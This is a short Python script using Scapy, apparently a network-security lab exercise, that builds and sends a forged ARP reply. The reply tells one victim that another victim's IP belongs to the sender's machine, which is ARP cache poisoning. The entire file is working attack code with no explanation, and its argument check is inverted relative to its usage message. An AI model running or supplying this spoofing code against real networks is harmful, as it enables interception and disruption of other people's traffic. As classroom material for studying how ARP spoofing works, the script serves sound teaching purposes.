#!/usr/bin/python3
from scapy.all import *
import sys

if len(sys.argv) > 3:
	sys.exit("Usage: sudo python3 task2-1A.py [victim1IP] [victim2IP]")

E=Ether()
A=ARP(op=2, psrc=sys.argv[1], pdst=sys.argv[2])
pkt=E/A
pkt.show()
sendp(pkt) # send at l2
